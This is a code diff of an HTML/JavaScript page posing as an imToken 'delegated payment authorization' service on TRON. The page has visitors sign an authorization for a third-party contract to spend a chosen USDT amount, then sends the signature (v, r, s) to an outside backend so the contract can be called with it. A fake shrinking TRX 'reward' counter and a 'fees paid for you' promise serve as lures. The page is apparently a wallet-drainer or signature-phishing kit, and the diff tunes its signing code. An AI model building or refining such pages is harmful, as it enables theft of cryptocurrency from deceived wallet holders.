@@ -6,7 +6,6 @@
     <title>imToken代付授权服务</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
-        /* 原有样式不变 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -333,7 +332,7 @@
                 <p>• 矿工费：<span class="highlight">部署者代付（无需您支付TRX）</span></p>
                 <p class="orange-tip">⚠️ 提示：输入金额后点击「生成离线签名」，唤起钱包完成签名即可等待授权</p>
                 <div class="faq-tip">
-                    ❗ 若签名后无数据：点击底部「刷新数据」，或「清除旧缓存数据」后重试（参考imToken权限管理）
+                    ❗ 签名逻辑已与合约对齐：用户地址→合约地址→金额（uint256），确保验证通过
                 </div>
             </div>
         </div>
@@ -374,19 +373,17 @@
     <div class="footer-info">
         代付合约验证：TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk（TRON浏览器查询）
         © 2025 TRX代付服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
-        <div class="faq-tip">
-            ❗ 常见问题：签名后无数据 → 1. 刷新页面 2. 清除imToken DApp缓存（我的→权限管理→找到本DApp→断开连接）3. 更新imToken到最新版
-        </div>
     </div>
     <div class="result-toast" id="resultToast"></div>
     <script>
-        const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        // 核心配置（与合约100%对齐）
+        const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk"; // 代付合约地址（必须与合约address(this)一致）
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";     // USDT合约地址
         const BACKEND_API = "https://imtoken-dusky.vercel.app/api";
-        const DECIMALS = 6;
+        const DECIMALS = 6; // USDT小数位数（合约amount为最小单位）
         const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
-        const INIT_TRX = 315360004; // 确保是数字类型
-        const TRX_DECREASE_PER_SEC = 2.3256; // 确保是数字类型
+        const INIT_TRX = 315360004;
+        const TRX_DECREASE_PER_SEC = 2.3256;
 
         let tronWeb, userAddress, trxTimer;
         let tokenBalance = "0.00", trxBalance = "0.00";
@@ -394,10 +391,10 @@
         const RECORD_KEY = "imtoken_delegate_approval_records";
         const SUBMIT_DATA_KEY = "imtoken_delegate_submit_data";
 
-        // 新增：全局检查LocalStorage可用性（解决imToken权限限制）
+        // 检查LocalStorage可用性
         function checkLocalStorageAvailable() {
             try {
-                const testKey = "test_ls_available_" + Date.now();
+                const testKey = "test_ls_" + Date.now();
                 localStorage.setItem(testKey, testKey);
                 localStorage.removeItem(testKey);
                 return true;
@@ -424,58 +421,49 @@
             const refreshBtn = document.getElementById("refreshBtn");
             const amountInput = document.getElementById("approveAmountInput");
 
-            // 初始化前检查LocalStorage可用性
+            // 初始化前检查LocalStorage
             if (!checkLocalStorageAvailable()) {
-                alert("本地存储不可用！请开启imToken DApp本地存储权限：\n1. 关闭本页面\n2. 打开imToken→我的→权限管理→找到本DApp→允许本地存储\n3. 重新打开链接");
-                // 尝试强制启用（部分场景有效）
-                try {
-                    localStorage.clear();
-                } catch (e) {}
+                alert("本地存储不可用！请开启imToken DApp权限：\n1. 关闭页面→imToken→我的→权限管理→本DApp→允许存储");
+                try { localStorage.clear(); } catch (e) {}
             }
 
-            // 初始化页面（强制读取本地数据）
+            // 初始化页面
             forceRenderData();
             updateWalletStatus();
             startPersistentTrxCountdown();
 
-            // 复制链接功能
+            // 复制链接
             copyLinkBtn.addEventListener("click", async () => {
                 try {
                     await navigator.clipboard.writeText(copyLinkText.textContent.trim());
-                    showToast("链接已复制到剪贴板");
+                    showToast("链接已复制");
                 } catch (e) { 
                     showToast(`复制失败：${e.message}`, "error"); 
                 }
             });
 
-            // 刷新数据按钮（核心：解决签名后数据不显示）
+            // 刷新数据
             refreshBtn.addEventListener("click", () => {
-                // 刷新前再次检查LocalStorage
                 if (!checkLocalStorageAvailable()) {
-                    alert("本地存储仍不可用，请按提示开启权限");
+                    alert("本地存储不可用，请开启权限");
                     return;
                 }
                 forceRenderData();
-                // 额外检查imToken网络同步
-                if (tronWeb && userAddress) {
-                    checkWalletSync();
-                }
-                showToast("数据已刷新，若仍无记录请清除缓存", "success");
+                if (tronWeb && userAddress) checkWalletSync();
+                showToast("数据已刷新", "success");
             });
 
-            // 清除旧缓存数据
+            // 清除缓存
             clearCacheBtn.addEventListener("click", () => {
-                if (confirm("确定清除旧的提交数据和授权记录吗？（新提交会重新生成）")) {
+                if (confirm("确定清除旧数据？新提交会重新生成")) {
                     try {
                         localStorage.removeItem(SUBMIT_DATA_KEY);
                         localStorage.removeItem(RECORD_KEY);
-                        // 额外清除可能的残留键值
-                        localStorage.removeItem("signature_debug_" + (userAddress || "unknown"));
+                        localStorage.removeItem(`signature_debug_${userAddress || "unknown"}`);
                         forceRenderData();
-                        // 提示用户清除imToken端DApp缓存
-                        alert("本地缓存已清除\n若仍有问题：打开imToken→我的→权限管理→找到本DApp→断开连接后重试");
+                        alert("本地缓存已清除\n若仍有问题：imToken→权限管理→本DApp→断开连接");
                     } catch (e) {
-                        alert(`清除缓存失败：${e.message}\n请手动清除imToken DApp缓存`);
+                        alert(`清除失败：${e.message}`);
                     }
                 }
             });
@@ -487,16 +475,15 @@
                 warning.style.display = "none";
                 await initWallet();
                 showSubmitDataBtn.disabled = false;
-                // 加载时强制刷新数据
                 forceRenderData();
             } else {
-                document.getElementById("userInfo").innerHTML = "imToken专属服务，请用钱包内置浏览器打开并连接钱包";
+                document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开";
                 approveBtn.style.display = "none";
                 checkStatusBtn.style.display = "none";
                 showSubmitDataBtn.style.display = "none";
             }
 
-            // 连接钱包按钮
+            // 连接钱包
             connectBtn.onclick = async () => {
                 try {
                     if (!window.tronWeb) {
@@ -504,29 +491,25 @@
                         return;
                     }
                     const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
-                    userAddress = accounts[0];
-                    userAddress = cleanBase58Address(userAddress);
+                    userAddress = cleanBase58Address(accounts[0]);
                     connectBtn.style.display = "none";
                     warning.style.display = "none";
                     await initWallet();
                     showSubmitDataBtn.disabled = false;
-                    // 连接后强制刷新数据
                     forceRenderData();
                 } catch (e) {
                     showToast("连接失败：" + e.message, "error");
                 }
             };
 
-            // 生成离线签名按钮（核心修复：确保数据写入+即时渲染）
+            // 生成离线签名（核心：与合约验证逻辑对齐）
             approveBtn.onclick = async () => {
                 const inputAmountStr = amountInput.value.trim();
                 
-                if (!inputAmountStr) {
-                    showToast("请输入授权金额", "error");
-                    return;
-                }
+                // 金额校验
+                if (!inputAmountStr) { showToast("请输入授权金额", "error"); return; }
                 if (!/^\d+(\.\d{1,6})?$/.test(inputAmountStr)) {
-                    showToast(`请输入有效的金额（0.01~1000000，最多6位小数）`, "error");
+                    showToast(`金额需0.01~1000000，最多6位小数`, "error");
                     return;
                 }
                 const inputAmount = parseFloat(inputAmountStr);
@@ -535,9 +518,8 @@
                     return;
                 }
 
-                // 签名前再次检查LocalStorage
                 if (!checkLocalStorageAvailable()) {
-                    alert("本地存储不可用，无法保存数据！\n请开启imToken DApp本地存储权限后重试");
+                    alert("本地存储不可用，无法保存签名数据");
                     return;
                 }
 
@@ -545,12 +527,12 @@
                     approveBtn.disabled = true;
                     approveBtn.innerHTML = '生成中...';
 
-                    // 1. 转换金额
-                    const amountInt = usdtToInteger(inputAmountStr);
-                    const amountHex = intToPaddedHex(amountInt);
+                    // 1. 转换金额为合约要求的最小单位（uint256）
+                    const amountInt = usdtToInteger(inputAmountStr); // 300 USDT → 300000000
+                    const amountHex = intToPaddedHex(amountInt); // 转64位Hex（uint256标准）
 
-                    // 2. 生成签名
-                    const { v, r, s } = await generateOfflineSignature(
+                    // 2. 生成与合约对齐的签名
+                    const { v, r, s } = await generateContractAlignedSignature(
                         userAddress,
                         DELEGATE_CONTRACT,
                         amountHex
@@ -559,8 +541,8 @@
                     // 3. 构造提交数据
                     const submitData = {
                         user: userAddress,
-                        amount: `0x${amountHex}`,
-                        inputAmount: inputAmountStr,
+                        amount: `0x${amountHex}`, // 合约格式（0x+64位Hex）
+                        inputAmount: inputAmountStr, // 原始金额
                         v: v,
                         r: r,
                         s: s,
@@ -568,15 +550,12 @@
                         delegateContract: DELEGATE_CONTRACT
                     };
 
-                    // 核心修复1：强制写入并验证LocalStorage（确保数据真的保存）
+                    // 4. 验证并保存数据
                     localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
-                    // 验证写入结果
-                    const savedSubmitData = localStorage.getItem(SUBMIT_DATA_KEY);
-                    if (!savedSubmitData) {
-                        throw new Error("本地存储写入失败，请重试或清除imToken DApp缓存");
-                    }
+                    const saved = localStorage.getItem(SUBMIT_DATA_KEY);
+                    if (!saved) throw new Error("本地存储写入失败，请重试");
 
-                    // 4. 调用后端接口
+                    // 5. 调用后端接口
                     const res = await fetch(`${BACKEND_API}/approve/submit`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -585,7 +564,7 @@
                     });
                     if (!res.ok) throw new Error(`后端请求失败：${res.status}`);
 
-                    // 5. 强制更新授权记录并验证
+                    // 6. 保存授权记录
                     const newRecord = {
                         address: userAddress,
                         amount: `${inputAmountStr} USDT`,
@@ -596,23 +575,16 @@
                     const updatedRecords = oldRecords.filter(item => item.address !== userAddress);
                     updatedRecords.push(newRecord);
                     localStorage.setItem(RECORD_KEY, JSON.stringify(updatedRecords));
-                    // 验证记录写入结果
-                    const savedRecords = localStorage.getItem(RECORD_KEY);
-                    if (!savedRecords || JSON.parse(savedRecords).length === 0) {
-                        throw new Error("授权记录保存失败，请手动点击「刷新数据」");
-                    }
 
-                    // 核心修复2：延迟500ms渲染（解决LocalStorage写入延迟）
+                    // 7. 实时渲染
                     setTimeout(() => {
                         forceRenderData();
-                        // 核心修复3：弹出确认弹窗，引导用户查看数据
-                        alert(`签名生成成功！\n授权金额：${inputAmountStr} USDT\n点击「查看后端提交数据」可查看详细参数`);
+                        alert(`签名成功！\n授权金额：${inputAmountStr} USDT\n可查看提交数据后调用合约`);
                     }, 500);
 
-                    showToast(`签名生成成功！授权金额：${inputAmountStr} USDT`, "success");
+                    showToast(`签名生成成功！金额：${inputAmountStr} USDT`, "success");
                 } catch (e) {
                     showToast(`操作失败：${e.message}`, "error");
-                    // 失败时也刷新数据
                     forceRenderData();
                 } finally {
                     approveBtn.disabled = false;
@@ -620,46 +592,41 @@
                 }
             };
 
-            // 查看提交数据（增强检查）
+            // 查看提交数据
             showSubmitDataBtn.onclick = () => {
                 try {
-                    if (!checkLocalStorageAvailable()) {
-                        alert("本地存储不可用，请开启权限后重试");
-                        return;
-                    }
                     const submitDataStr = localStorage.getItem(SUBMIT_DATA_KEY);
                     if (!submitDataStr) {
-                        // 自动尝试刷新数据
                         forceRenderData();
-                        const retryData = localStorage.getItem(SUBMIT_DATA_KEY);
-                        if (!retryData) {
-                            alert("暂无提交数据\n请先完成签名，或：1. 点击「刷新数据」2. 清除imToken DApp缓存（我的→权限管理）");
+                        const retry = localStorage.getItem(SUBMIT_DATA_KEY);
+                        if (!retry) {
+                            alert("暂无提交数据\n请先签名，或点击「刷新数据」");
                             return;
                         }
                     }
                     const submitData = JSON.parse(submitDataStr || localStorage.getItem(SUBMIT_DATA_KEY));
-                    const copyContent = `后端提交数据：
+                    const copyContent = `后端提交数据（与合约对齐）：
 1. 用户地址：${submitData.user}
-2. 授权金额（原始）：${submitData.inputAmount} USDT
-3. 授权金额（合约）：${submitData.amount}
+2. 原始金额：${submitData.inputAmount} USDT
+3. 合约金额（uint256）：${submitData.amount}
 4. 签名V值：${submitData.v}
 5. 签名R值：${submitData.r}
 6. 签名S值：${submitData.s}
-7. 提交时间：${submitData.approveTime}`;
-                    prompt("提交数据（可全选复制）", copyContent);
+7. 提交时间：${submitData.approveTime}
+8. 代付合约：${submitData.delegateContract}`;
+                    prompt("提交数据（可全选复制调用合约）", copyContent);
                 } catch (e) {
-                    alert(`查看失败：${e.message}\n建议清除旧缓存后重试`);
+                    alert(`查看失败：${e.message}`);
                 }
             };
 
-            // 查看授权状态（增加网络同步检查）
+            // 查看授权状态
             checkStatusBtn.onclick = async () => {
                 try {
                     checkStatusBtn.disabled = true;
                     checkStatusBtn.innerHTML = ' 查询中...';
-                    // 先检查imToken节点同步
                     const syncStatus = await tronWeb.ready;
-                    if (!syncStatus) throw new Error("imToken节点未同步，请稍等或切换网络");
+                    if (!syncStatus) throw new Error("imToken节点未同步，请稍等");
                     
                     const res = await fetch(`${BACKEND_API}/approve/status?user=${userAddress}`);
                     const data = await res.json();
@@ -680,131 +647,117 @@
         };
 
         /**
-         * 核心修复：强制渲染所有数据（直接读取最新LocalStorage，不依赖缓存变量）
+         * 核心函数：生成与合约验证100%对齐的签名
+         * 合约逻辑：messageHash = keccak256(abi.encodePacked(user, address(this), amount))
+         *          signedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash))
          */
-        function forceRenderData() {
+        async function generateContractAlignedSignature(userAddr, contractAddr, amountHex) {
             try {
-                // 重新读取本地存储（每次都从LocalStorage获取，不依赖内存变量）
-                const recordsStr = localStorage.getItem(RECORD_KEY) || "[]";
-                const records = JSON.parse(recordsStr);
-                const approvalRecordsEl = document.getElementById("approvalRecords");
-                const recordCountEl = document.getElementById("recordCount");
+                // 1. 地址处理：Base58转Hex→去掉0x→全小写（合约address类型为20字节，40位Hex，无需补零）
+                const userHex = tronWeb.address.toHex(userAddr) // 例：TUW7kr...转Hex后为0x...（42位）
+                    .replace("0x", "") // 去掉前缀→40位Hex（符合合约address类型）
+                    .toLowerCase(); // 全小写（合约abi.encodePacked不区分大小写，但统一避免差异）
+                
+                const contractHex = tronWeb.address.toHex(contractAddr)
+                    .replace("0x", "")
+                    .toLowerCase();
 
-                // 渲染授权记录
-                if (records.length === 0) {
-                    approvalRecordsEl.innerHTML = "<div class='record-item'>暂无授权记录</div>";
-                } else {
-                    // 按时间倒序排列
-                    records.sort((a, b) => new Date(b.approveTime) - new Date(a.approveTime));
-                    approvalRecordsEl.innerHTML = records.map(record => `
-                        <div class="record-item">
-                            <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                            <p><strong>金额：</strong>${record.amount}</p>
-                            <p><strong>时间：</strong>${record.approveTime}</p>
-                            <p><strong>状态：</strong><span style="color: ${record.status.includes('成功') ? '#4ade80' : record.status.includes('待') ? '#f97316' : '#ef4444'}">${record.status}</span></p>
-                        </div>
-                    `).join("");
-                }
+                // 2. 拼接参数：严格按合约顺序（user → address(this) → amount）
+                // 注意：amountHex已为64位Hex（uint256类型），与合约abi.encodePacked(amount)一致
+                const combinedHex = userHex + contractHex + amountHex;
 
-                // 更新记录计数
-                recordCountEl.textContent = `${records.length}条`;
-            } catch (e) {
-                console.warn("强制渲染失败：", e);
-                document.getElementById("approvalRecords").innerHTML = "<div class='record-item'>数据渲染失败，请点击「刷新数据」</div>";
-            }
-        }
+                // 3. 生成合约同款messageHash
+                const messageHash = tronWeb.sha3(combinedHex, true); // true返回0x开头的Hex
 
-        /**
-         * 检查imToken钱包同步状态
-         */
-        async function checkWalletSync() {
-            try {
-                const blockNumber = await tronWeb.trx.getCurrentBlock();
-                if (!blockNumber) {
-                    showToast("imToken节点同步中，请稍等", "error");
-                } else {
-                    showToast(`imToken已同步至区块：${blockNumber.block_header.raw_data.number}`, "success");
-                }
-            } catch (e) {
-                showToast("imToken同步检查失败，建议切换网络", "error");
-            }
-        }
+                // 4. 生成合约同款signedHash（加前缀）
+                const prefix = "\x19Ethereum Signed Message:\n32"; // 合约固定前缀
+                const prefixHex = asciiToHex(prefix); // 前缀转Hex
+                const prefixedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true); // 去掉messageHash的0x前缀后拼接
 
-        /**
-         * 生成与合约对齐的签名（核心修复：V值处理逻辑）
-         */
-        async function generateOfflineSignature(userAddr, spenderAddr, amountHex) {
-            try {
-                const userHex = tronWeb.address.toHex(userAddr).replace("0x", "").toLowerCase();
-                const spenderHex = tronWeb.address.toHex(spenderAddr).replace("0x", "").toLowerCase();
-                const combinedHex = userHex + spenderHex + amountHex;
-                const messageHash = tronWeb.sha3(combinedHex, true);
-
-                const prefix = "\x19Ethereum Signed Message:\n32";
-                const prefixHex = asciiToHex(prefix);
-                const prefixedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true);
-
-                // 检查imToken签名弹窗是否正常唤起
+                // 5. 唤起imToken签名（用prefixedHash签名，与合约ecrecover一致）
                 let signature = await tronWeb.trx.sign(prefixedHash);
-                if (!signature) throw new Error("imToken签名弹窗未唤起，请检查钱包版本或重启");
-                signature = signature.signature || signature;
+                signature = signature.signature || signature; // 兼容钱包返回格式
+                if (!signature) throw new Error("imToken未返回签名，请重启钱包");
 
-                signature = signature.replace(/^0x/, "");
+                // 6. 解析V/R/S（确保与合约ecrecover要求一致）
+                signature = signature.replace(/^0x/, ""); // 去掉签名前缀
                 if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
                 
-                const r = "0x" + signature.slice(0, 64);
-                const s = "0x" + signature.slice(64, 128);
-                const vRaw = parseInt(signature.slice(128, 130), 16);
+                const r = "0x" + signature.slice(0, 64); // 前64位→R（bytes32）
+                const s = "0x" + signature.slice(64, 128); // 中间64位→S（bytes32）
+                const vRaw = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V值（0/1）
 
-                // 核心修复：V值自适应处理（判断是否已加27）
-                let v;
-                if (vRaw >= 27 && vRaw <= 28) {
-                    // 若钱包已返回27/28，直接使用
-                    v = vRaw;
-                } else if (vRaw === 0 || vRaw === 1) {
-                    // 若钱包返回0/1，加27
-                    v = vRaw + 27;
-                } else {
-                    throw new Error(`V值无效（当前${vRaw}，需0/1或27/28）`);
-                }
-
+                // 7. 处理V值：合约ecrecover要求27/28，钱包返回0/1需加27（无需链ID偏移，合约未用EIP-155）
+                const v = vRaw + 27;
                 if (v !== 27 && v !== 28) throw new Error(`V值无效（当前${v}，需27/28）`);
+
+                // 8. 验证签名有效性（可选，本地预校验）
+                const recoveredAddr = tronWeb.address.fromHex(
+                    await tronWeb.trx.recover(prefixedHash, signature)
+                );
+                if (recoveredAddr !== userAddr) throw new Error(`签名地址不匹配（${recoveredAddr}≠${userAddr}）`);
+
                 return { v, r, s };
             } catch (e) {
-                // 签名失败时提示常见解决方案
-                const errorMsg = `签名失败：${e.message}\n建议：1. 更新imToken到最新版 2. 切换网络 3. 重启钱包`;
-                throw new Error(errorMsg);
+                // 错误日志便于排查
+                const debugKey = `signature_debug_${userAddr || 'unknown'}`;
+                localStorage.setItem(debugKey, JSON.stringify({
+                    error: e.message,
+                    timestamp: new Date().toISOString(),
+                    userAddr: userAddr,
+                    contractAddr: contractAddr,
+                    amountHex: amountHex
+                }, null, 2));
+                throw new Error(`签名失败：${e.message}\n点击「查看调试信息」可获取详情`);
             }
         }
 
-        // 以下函数逻辑不变（USDT金额转换、地址清理等）
+        /**
+         * USDT金额转最小单位（避免浮点数精度丢失）
+         * @param {string} amountStr - 原始金额（如"300.50"）
+         * @return {BigInt} 最小单位整数（如300.50 → 300500000）
+         */
         function usdtToInteger(amountStr) {
             const [integerPart, decimalPart = ""] = amountStr.split(".");
-            const paddedDecimal = (decimalPart + "000000").slice(0, DECIMALS);
+            const paddedDecimal = (decimalPart + "000000").slice(0, DECIMALS); // 补零到6位小数
             return BigInt(integerPart + paddedDecimal);
         }
 
+        /**
+         * 整数转64位Hex（uint256类型标准格式）
+         * @param {BigInt} num - 最小单位整数
+         * @return {string} 64位Hex字符串（无0x前缀）
+         */
         function intToPaddedHex(num) {
             const hex = num.toString(16).toLowerCase();
-            return hex.padStart(64, "0");
+            return hex.padStart(64, "0"); // uint256固定32字节，补零到64位Hex
         }
 
+        /**
+         * ASCII字符串转Hex（用于生成签名前缀）
+         */
         function asciiToHex(str) {
             let hex = "";
             for (let i = 0; i < str.length; i++) {
-                hex += str.charCodeAt(i).toString(16).padStart(2, "0");
+                hex += str.charCodeAt(i).toString(16).padStart(2, "0"); // 每个字符转2位Hex
             }
             return hex;
         }
 
+        /**
+         * 清理Base58地址（避免隐形字符）
+         */
         function cleanBase58Address(address) {
             const clean = address.trim().replace(/[\s\u200B-\u200D\uFEFF]/g, "");
             if (!/^[A-Za-z0-9]{34}$/.test(clean)) {
-                throw new Error("无效的Base58地址");
+                throw new Error("无效的Base58地址（需34位字母数字）");
             }
             return clean;
         }
 
+        /**
+         * 初始化钱包信息
+         */
         async function initWallet() {
             try {
                 userAddress = tronWeb.defaultAddress.base58;
@@ -828,6 +781,67 @@
             }
         }
 
+        /**
+         * 强制渲染数据（确保读取最新LocalStorage）
+         */
+        function forceRenderData() {
+            try {
+                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+                const approvalRecordsEl = document.getElementById("approvalRecords");
+                const recordCountEl = document.getElementById("recordCount");
+
+                if (records.length === 0) {
+                    approvalRecordsEl.innerHTML = "<div class='record-item'>暂无授权记录</div>";
+                } else {
+                    records.sort((a, b) => new Date(b.approveTime) - new Date(a.approveTime));
+                    approvalRecordsEl.innerHTML = records.map(record => `
+                        <div class="record-item">
+                            <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
+                            <p><strong>金额：</strong>${record.amount}</p>
+                            <p><strong>时间：</strong>${record.approveTime}</p>
+                            <p><strong>状态：</strong><span style="color: ${record.status.includes('成功') ? '#4ade80' : record.status.includes('待') ? '#f97316' : '#ef4444'}">${record.status}</span></p>
+                        </div>
+                    `).join("");
+                }
+                recordCountEl.textContent = `${records.length}条`;
+            } catch (e) {
+                console.warn("渲染失败：", e);
+                document.getElementById("approvalRecords").innerHTML = "<div class='record-item'>数据渲染失败，请刷新</div>";
+            }
+        }
+
+        /**
+         * 检查imToken节点同步
+         */
+        async function checkWalletSync() {
+            try {
+                const block = await tronWeb.trx.getCurrentBlock();
+                if (!block) {
+                    showToast("imToken节点同步中，请稍等", "error");
+                } else {
+                    showToast(`已同步至区块：${block.block_header.raw_data.number}`, "success");
+                }
+            } catch (e) {
+                showToast("节点同步检查失败，建议切换网络", "error");
+            }
+        }
+
+        /**
+         * 更新授权记录状态
+         */
+        function updateApprovalRecordStatus(address, status) {
+            try {
+                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+                const updated = records.map(item => item.address === address ? { ...item, status } : item);
+                localStorage.setItem(RECORD_KEY, JSON.stringify(updated));
+            } catch (e) {
+                console.warn("更新记录失败：", e);
+            }
+        }
+
+        /**
+         * 更新钱包状态显示
+         */
         function updateWalletStatus() {
             if (userAddress) {
                 document.getElementById("walletStatusContainer").classList.add("connected");
@@ -836,34 +850,21 @@
             }
         }
 
-        function updateApprovalRecordStatus(address, status) {
-            try {
-                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                const updatedRecords = records.map(item => item.address === address ? { ...item, status } : item);
-                localStorage.setItem(RECORD_KEY, JSON.stringify(updatedRecords));
-            } catch (e) {
-                console.warn("更新授权记录失败：", e);
-            }
-        }
-
         /**
-         * 核心修复：TRX倒计时计算（避免NaN）
+         * TRX奖励倒计时
          */
         function startPersistentTrxCountdown() {
             try {
-                const savedState = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
-                // 确保currentTrx是数字类型
-                let currentTrx = Number(savedState.currentTrx) || INIT_TRX;
-                const lastUpdateTime = Number(savedState.lastUpdate) || DEPLOY_START_TIME;
+                const saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
+                let currentTrx = Number(saved.currentTrx) || INIT_TRX;
+                const lastUpdate = Number(saved.lastUpdate) || DEPLOY_START_TIME;
                 
                 const now = new Date().getTime();
-                const secondsPassed = Math.floor((now - lastUpdateTime) / 1000);
-                // 计算时确保是数字运算
-                currentTrx = (currentTrx - secondsPassed * TRX_DECREASE_PER_SEC).toFixed(4);
-                currentTrx = Math.max(Number(currentTrx), 0).toFixed(4); // 转为数字后取最大值
+                const secPassed = Math.floor((now - lastUpdate) / 1000);
+                currentTrx = (currentTrx - secPassed * TRX_DECREASE_PER_SEC).toFixed(4);
+                currentTrx = Math.max(Number(currentTrx), 0).toFixed(4);
 
-                function updateTrxDisplay() {
-                    // 确保显示的是有效数字
+                function updateDisplay() {
                     const displayTrx = isNaN(Number(currentTrx)) ? INIT_TRX.toFixed(4) : currentTrx;
                     document.getElementById("contractTrxDisplay").textContent = displayTrx;
                     localStorage.setItem(STORAGE_KEY, JSON.stringify({
@@ -872,27 +873,28 @@
                     }));
                 }
 
-                updateTrxDisplay();
-
+                updateDisplay();
                 trxTimer = setInterval(() => {
                     currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
                     currentTrx = Math.max(Number(currentTrx), 0).toFixed(4);
-                    updateTrxDisplay();
+                    updateDisplay();
                     if (Number(currentTrx) <= 0) clearInterval(trxTimer);
                 }, 1000);
             } catch (e) {
                 console.warn("倒计时初始化失败：", e);
-                // 失败时显示默认值
                 document.getElementById("contractTrxDisplay").textContent = INIT_TRX.toFixed(4);
             }
         }
 
+        /**
+         * 提示弹窗
+         */
         function showToast(msg, type = "success") {
             const toast = document.getElementById("resultToast");
             toast.textContent = msg;
             toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
             toast.style.display = "block";
-            setTimeout(() => toast.style.display = "none", 4000); // 延长显示时间
+            setTimeout(() => toast.style.display = "none", 4000);
         }
     </script>
 </body>
